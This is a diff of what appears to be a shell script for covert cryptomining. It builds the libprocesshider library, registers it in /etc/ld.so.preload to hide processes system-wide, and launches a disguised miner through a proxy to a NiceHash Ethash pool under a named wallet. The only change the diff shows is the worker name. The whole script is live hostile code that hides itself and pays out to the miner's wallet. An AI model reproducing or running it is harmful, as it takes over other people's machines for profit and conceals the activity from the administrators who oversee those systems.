@@ -44,4 +44,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-east.nicehash.com:3353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.BAKULKULI --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-east.nicehash.com:3353 --user 36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.A --ethstratum ETHPROXY
